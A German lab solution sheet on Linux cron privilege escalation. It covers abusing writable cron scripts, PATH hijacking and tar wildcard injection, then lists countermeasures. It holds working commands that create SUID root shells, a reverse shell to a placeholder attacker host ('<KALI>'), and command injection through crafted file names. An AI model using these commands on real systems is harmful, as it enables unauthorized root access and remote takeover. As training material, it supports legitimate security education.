# Lösung – Übung 05: Cron & PATH/Wildcard

## 1. Cron-Job finden

```bash
cat /etc/crontab; ls -la /etc/cron.*
./pspy64            # live: UID=0 startet /opt/backup.sh alle N Minuten
```

## 2. Writable Script

```bash
ls -la /opt/backup.sh            # schreibbar?
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
# warten bis Cron läuft, dann:
/tmp/rootbash -p                 # -> euid=root
# oder Reverse-Shell:
echo 'bash -i >& /dev/tcp/<KALI>/4444 0>&1' >> /opt/backup.sh
```

## 3. PATH-Hijacking

Cron-Skript ruft `backup` (ohne Pfad) auf, `PATH` beginnt mit beschreibbarem Verzeichnis:
```bash
cd /tmp
cat > backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
EOF
chmod +x backup
# sicherstellen, dass /tmp im PATH des Jobs vorkommt (oft im Skript gesetzt)
# nach dem nächsten Lauf:
/tmp/rootbash -p
```

## 4. Wildcard-Injection (tar)

Cron: `cd /opt/data && tar -czf /opt/backup.tar.gz *`:
```bash
cd /opt/data
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > run.sh; chmod +x run.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh run.sh'
# tar interpretiert die Dateinamen als Optionen -> führt run.sh als root aus
/tmp/rootbash -p
```

## 5. Gegenmaßnahmen

- **Writable Script:** Cron-Skripte nur root-schreibbar (`chmod 700 root:root`).
- **PATH:** im Cron-Job absolute Pfade (`/usr/bin/backup`), festes `PATH=` setzen.
- **Wildcard:** kein `*` auf nutzerbeschreibbaren Verzeichnissen; `./` voranstellen bzw. `--` nutzen, sichere Tools.
- Generell: least privilege, Jobs nicht in world-writable Ordnern.

## Häufige Fehler / Troubleshooting

- **Job feuert nicht:** Intervall abwarten (pspy zeigt es); Zeit/Timezone prüfen.
- **Script nicht writable:** anderer Vektor (PATH/Wildcard) oder Übung 06.
- **Reverse-Shell kommt nicht:** `<KALI>`/Port/Listener; SUID-bash-Variante ist robuster.
- **`--`-Dateien anlegen:** `touch -- '--name'` nötig, sonst meckert die Shell über Optionen.
